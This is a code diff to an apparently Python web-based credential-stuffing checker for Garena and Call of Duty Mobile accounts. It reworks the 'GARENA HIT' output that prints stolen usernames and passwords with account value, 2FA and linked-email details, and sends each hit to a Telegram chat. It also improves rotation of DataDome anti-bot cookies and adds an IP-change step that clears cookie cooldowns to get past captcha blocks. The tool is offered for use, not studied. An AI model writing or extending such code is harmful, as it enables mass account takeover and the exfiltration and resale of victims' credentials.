@@ -70,6 +70,7 @@ check_status = {
     'captcha_detected': False,
     'stop_requested': False,
     'current_account': '',
+    'cookie_state': {}, # For IP Change functionality
 }
 # Lock for thread-safe access to the check_status
 status_lock = threading.Lock()
@@ -328,25 +329,25 @@ def format_result(last_login, country, shell, mobile, facebook, email_verified, 
     has_codm = "No CODM account found" not in connected_games[0]
     
     console_message = f"""
-[✅] GARENA ACCOUNT HIT
-   [🔑 Credentials]
-      User: {username}
-      Pass: {password}
-   [📊 Information]
-      Country: {country}
-      Shells: {shell} 💰
-      Last Login: {last_login}
-      Email: {email} {email_ver_text}
-      Facebook: {fb}
-   [🎮 CODM Details]
-      {connected_games[0].replace(chr(10), chr(10) + "      ")}
-   [🛡️ Security]
-      Status: {is_clean_text}
-      Mobile Bind: {bool_status_text('True' if mobile != 'N/A' else 'False')}
-      Facebook Link: {bool_status_text(facebook)}
-      2FA Enabled: {bool_status_text(two_step_enabled)}
-      Authenticator: {bool_status_text(authenticator_enabled)}
-      - Presented By: @KenshiKupal -
+👑 GARENA HIT 👑
+ ─── 🔑 Credentials ───
+    📧 Email/User: {username}
+    🔒 Pass: {password}
+ ─── 📊 Account Info ───
+    🌍 Country: {country}
+    💰 Shells: {shell}
+    ⏰ Last Login: {last_login}
+    📧 Email: {email} {email_ver_text}
+    📘 Facebook: {fb}
+ ─── 🎮 CODM Details ───
+    {connected_games[0].replace(chr(10), chr(10) + "    ")}
+ ─── 🛡️ Security ───
+    🚦 Status: {is_clean_text}
+    📱 Mobile Bind: {bool_status_text('True' if mobile != 'N/A' else 'False')}
+    🔗 Facebook Link: {bool_status_text(facebook)}
+    🔐 2FA Enabled: {bool_status_text(two_step_enabled)}
+    🛡️ Authenticator: {bool_status_text(authenticator_enabled)}
+ ─── Presented By: @KenshiKupal ───
     """.strip()
 
     codm_level_num = int(codm_level) if isinstance(codm_level, str) and codm_level.isdigit() else 0
@@ -356,30 +357,30 @@ def format_result(last_login, country, shell, mobile, facebook, email_verified, 
         s_email, s_fb, s_last_login = html.escape(email), html.escape(fb), html.escape(last_login)
         tg_clean_status, tg_email_ver = ("Clean ✔", "(Verified✔)") if is_clean else ("Not Clean ⚠️", "(Not Verified⚠️)")
         tg_codm_info = "\n".join([f"  <code>{html.escape(line.strip())}</code>" for line in connected_games[0].strip().split('\n')])
-        tg_title = "✅ <b>GARENA ACCOUNT HIT | LEVEL 100+</b> ✅" if codm_level_num >= 100 else "✅ <b>GARENA ACCOUNT HIT</b> ✅"
+        tg_title = "👑 <b>GARENA HIT | LEVEL 100+</b> 👑" if codm_level_num >= 100 else "👑 <b>GARENA HIT</b> 👑"
         telegram_message = f"""
 {tg_title}
 - - - - - - - - - - - - - - - - -
-🔑  <b><u>Credentials:</u></b>
-  <b>User:</b> <code>{s_user}</code>
-  <b>Pass:</b> <code>{s_pass}</code>
+🔑  <b>Credentials:</b>
+  - <b>User:</b> <code>{s_user}</code>
+  - <b>Pass:</b> <code>{s_pass}</code>
 - - - - - - - - - - - - - - - - -
-📊  <b><u>Account Info:</u></b>
-  <b>Country:</b> {s_country}
-  <b>Shells:</b> {shell} 💰
-  <b>Last Login:</b> {s_last_login}
-  <b>Email:</b> <code>{s_email}</code> {tg_email_ver}
-  <b>Facebook:</b> <code>{s_fb}</code>
+📊  <b>Account Info:</b>
+  - <b>🌍 Country:</b> {s_country}
+  - <b>💰 Shells:</b> {shell}
+  - <b>⏰ Last Login:</b> {s_last_login}
+  - <b>📧 Email:</b> <code>{s_email}</code> {tg_email_ver}
+  - <b>📘 Facebook:</b> <code>{s_fb}</code>
 - - - - - - - - - - - - - - - - -
-🎮  <b><u>CODM Details:</u></b>
+🎮  <b>CODM Details:</b>
 {tg_codm_info}
 - - - - - - - - - - - - - - - - -
-🛡️  <b><u>Security Status:</u></b>
-  <b>Account Status:</b> {tg_clean_status}
-  <b>Mobile Bind:</b> {'True ✔' if mobile != 'N/A' else 'False ❌'}
-  <b>Facebook Link:</b> {'True ✔' if facebook == 'True' else 'False ❌'}
-  <b>2FA Enabled:</b> {'True ✔' if two_step_enabled == 'True' else 'False ❌'}
-  <b>Authenticator:</b> {'True ✔' if authenticator_enabled == 'True' else 'False ❌'}
+🛡️  <b>Security Status:</b>
+  - <b>🚦 Status:</b> {tg_clean_status}
+  - <b>📱 Mobile Bind:</b> {'True ✔' if mobile != 'N/A' else 'False ❌'}
+  - <b>🔗 Facebook Link:</b> {'True ✔' if facebook == 'True' else 'False ❌'}
+  - <b>🔐 2FA Enabled:</b> {'True ✔' if two_step_enabled == 'True' else 'False ❌'}
+  - <b>🛡️ Authenticator:</b> {'True ✔' if authenticator_enabled == 'True' else 'False ❌'}
 - - - - - - - - - - - - - - - - -
 <i>Presented By: @KenshiKupal</i>
         """.strip()
@@ -530,12 +531,14 @@ def run_check_task(file_path, telegram_bot_token, telegram_chat_id, selected_coo
         
         accounts_to_process = accounts[start_from_index:]
         
+        cookie_state = {'pool': [], 'index': -1, 'cooldown': {}}
+        
         with status_lock:
             check_status['total'] = total_accounts
             check_status['progress'] = start_from_index
             check_status['stats'] = stats
+            check_status['cookie_state'] = cookie_state # Share cookie state for IP change
 
-        cookie_state = {'pool': [], 'index': -1, 'cooldown': {}}
         if use_cookie_set:
             cookie_state['pool'] = [c.get('datadome') for c in cookie_config.COOKIE_POOL if c.get('datadome')]
             log_message(f"[🍪] Loaded {len(cookie_state['pool'])} hardcoded DataDome cookies.", "text-info")
@@ -606,7 +609,7 @@ def run_check_task(file_path, telegram_bot_token, telegram_chat_id, selected_coo
                         
                         expiry_time = time.time() + 300
                         cookie_state['cooldown'][current_datadome] = expiry_time
-                        log_message(f"[⏳] Cookie placed on cooldown for 5 minutes.", "text-warning")
+                        log_message(f"[⏳] Cookie ...{current_datadome[-6:]} is burned. Temporarily removed from pool for 5 minutes.", "text-warning")
 
                         with status_lock:
                             check_status['captcha_detected'] = True
@@ -718,7 +721,8 @@ def start_check():
 
         check_status = {
             'running': True, 'progress': 0, 'total': 0, 'logs': [], 'stats': {},
-            'final_summary': None, 'captcha_detected': False, 'stop_requested': False, 'current_account': ''
+            'final_summary': None, 'captcha_detected': False, 'stop_requested': False, 'current_account': '',
+            'cookie_state': {},
         }
         stop_event.clear()
         captcha_pause_event.clear()
@@ -790,7 +794,12 @@ def captcha_action():
             for c in new_pool: save_datadome_cookie(c)
 
     elif action == 'retry_ip':
-        log_message("[IP] Assuming IP has been changed. Retrying...", "text-info")
+        with status_lock:
+            if 'cookie_state' in check_status and 'cooldown' in check_status['cookie_state']:
+                check_status['cookie_state']['cooldown'].clear()
+                log_message("[✅ IP] Cookie cooldowns have been cleared. Resuming with all cookies.", "text-success")
+            else:
+                log_message("[⚠️ IP] Could not clear cookie cooldowns (state not found).", "text-warning")
     
     elif action == 'stop_checker':
         trigger_stop()
